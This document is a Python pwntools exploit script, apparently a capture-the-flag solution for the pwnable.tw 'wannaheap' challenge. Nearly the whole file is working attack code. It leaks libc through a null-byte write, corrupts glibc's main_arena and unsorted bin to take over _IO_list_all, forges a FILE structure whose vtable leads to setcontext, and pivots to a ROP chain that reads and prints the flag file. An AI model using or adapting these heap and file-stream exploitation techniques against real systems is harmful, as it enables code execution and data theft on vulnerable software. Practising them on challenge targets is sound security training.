from pwn import *
import time 
'''
struct alloc{
    int_64 left
    int_64 right
    int_64 key
    int_64* data_ptr  
    int_64 rand_num
}

'''
#context(os="linux",arch="amd64",log_level='debug')
#r = process("./W", env={"LD_PRELOAD" : "./libc-4e5dfd832191073e18a09728f68666b6465eeacd.so"})

def create_data_heap(size, content):
    r.sendlineafter(b'Size :',str(size))
    r.sendafter(b'Content :',content)

def alloc(key,data):
    r.sendafter(b'> ',b'A')
    r.sendafter(b'key :',key)
    r.sendafter(b'data :',data)

def alloc_2(key,data):
    r.send(b'A')
    r.sendline(key)
    r.send(data)

def read_a(key):
    r.sendafter(b'> ',b'R')
    r.sendafter(b'key:',key)

## vuln1 : one arbitray  null byte write at libc  when calling  create_data_heap_chunks

while True :
    try :
        
        r = remote(b'chall.pwnable.tw',10305)
        #r = process("./W", env={"LD_PRELOAD" : "./libc-4e5dfd832191073e18a09728f68666b6465eeacd.so"})
        
        data_heap_size = 0x300000 
        offset = 0x3c18f8

        r.sendlineafter(b'Size :',str(0x6c2900 - 0x18))
        create_data_heap(0x300000,b'\x71'*8 + b'/home/wannaheap/flag\x00')
        #create_data_heap(0x300000,b'\x71'*8 + b'/flag\x00')

        alloc(b'B',b'b')
        alloc(b'C',b'b')
        alloc(b'D',b'b'*0x1)
        read_a(b'D')
    
        r.recvuntil(b'data : ')
        leak = r.recv(6)
        if b'\x7f' not in leak :
            raise
        libc = u64(leak+b'\x00\x00') - 0x3c3762
        print(f'libc : {hex(libc)}')
        break
    except :
        r.close()
        pass 

## overwrite _IO_buf_end to somewher below malloc_hook
IO_end = libc + 0x3c1900 + 0xc50

r.send(b'R')
r.send(p64(IO_end))
#time.sleep(5)
# input()

#### overwrite unsorted bin to do unsorted bin attack at IO_list_all
realloc = libc + 0x86f00 +0x06
data_heap = libc - 0x300ff8
fake_IO_list_all = libc +  0x3c1cb8
_IO_flush_all_lockp = libc + 0x372fc
stdin = libc + 0x3c18c0
getc = libc + 0x778e0
_IO_str_jumps = libc + 0x3be4c0
_IO_str_jumps = libc + 0x3be580
setcontext = libc + 0x48045
fake_context_addr = libc + 0x3c1da8
rop_addr = libc + 0x3c1e70
print(f'_IO_flush_all_lockp : {hex(_IO_flush_all_lockp)}')
print(f'_IO_str_jumps : {hex(_IO_str_jumps)}')

input()
r.send(b'A')
payload = p64(IO_end) + b'\x00' * 0x30 + b'\xff' * 8 + b'\x00'*8
payload += p64(libc + 0x3c3770) + b'\xff' * 8 +  p64(0) + p64(libc + 0x3c19a0)
payload += p64(0 ) * 3 + p64(0x00000000ffffffff) + p64(0) * 2 
payload += p64(libc + 0x3be400) ## vtable _IO_file_jumps

fake_chunk = p64(0) + p64(0) + p64(0)
fake_chunk = fake_chunk.ljust(0xa0,b'\x00') + p64(0x21) + p64(0)

payload = (payload + fake_chunk).ljust(0x1e8,b'\x00')
payload += p64(0) + p64(_IO_flush_all_lockp)  ### realloc_hook + malloc_hook
payload += p64(0) 
payload += p64(0) + p32(0) + p32(0) + p64(0) * 9 ### main_arena
payload += p64(data_heap) + p64(0)  # top chunk & last reminder
payload += p64(libc + 0x3c1b58) *2  ### unsorted bin

offset = libc + 0x3c1b68

for i in range(20) :
    payload += p64(offset + i*8) * 2

### rop gadget 
open_addr = libc + 0xf8660
read_addr = libc + 0xf8880
write_addr = libc + 0xf88e0
syscall_ret = libc + 0xbc765
pop_rdi_ret = libc + 0x1fd7a
pop_rsi_ret = libc + 0x1fcbd
pop_rdx_ret = libc + 0x1b92
pop_rax_ret = libc + 0x3a998


fake_file_list = p64(0)
fake_file_list += p64(0) * 3
fake_file_list += p64(0) + p64(1) ### io_write_ptr > io_write_base
fake_file_list += p64(0) 
fake_file_list += p64(fake_context_addr) ### _IO_buf_base = rdi
fake_file_list += p64(0) * 5 + p64(data_heap )  ### _chain
fake_file_list = fake_file_list.ljust(0xd8,b'\x00')
fake_file_list += p64(_IO_str_jumps - 0x8 ) ## vtable : _IO_str_finish
fake_file_list += p64(0) + p64(setcontext)

fake_context = p64(0)
fake_context = fake_context.ljust(0x68,b'\x00')
fake_context += p64(data_heap + 0x10) # rdi
fake_context += p64(0) # rsi
fake_context = fake_context.ljust(0x88,b'\x00')
fake_context += p64(0) # rdx
fake_context = fake_context.ljust(0xa0,b'\x00')
fake_context += p64(rop_addr) # rsp
fake_context += p64(pop_rax_ret) # ret addr 
fake_context += p64(0) * 3 # padding


rop = p64(2) + p64(syscall_ret)

rop += p64(pop_rdi_ret) + p64(1)
rop += p64(pop_rsi_ret) + p64(data_heap+0x100)
rop += p64(pop_rdx_ret) + p64(0x50)
rop += p64(pop_rax_ret) + p64(0)
rop += p64(syscall_ret)

rop += p64(pop_rdi_ret) + p64(0)
rop += p64(pop_rsi_ret) + p64(data_heap+0x100)
rop += p64(pop_rdx_ret) + p64(0x50)
rop += p64(pop_rax_ret) + p64(1)
rop += p64(syscall_ret)

rop += p64(pop_rax_ret) + p64(231)
rop += p64(syscall_ret)
#rop += p64()


fake_file_list = (fake_file_list + fake_context + rop).ljust(0x6a0,b'\x00')
payload += fake_file_list



payload += p64(0)*2 + p64(libc + 0x3c1b00) + p64(0) + p64(1) + p64(0x21000) * 2
payload += p64(0) * 7 + p64(1) + p64(2) + p64(0) * 18
payload += p64(libc + 0x175860) + p64(libc + 0x174960) + p64(libc + 0x174f60) + p64(0) * 16
payload += p64(fake_IO_list_all) ## IO_list_all

r.send(payload)
time.sleep(1)

r.interactive()

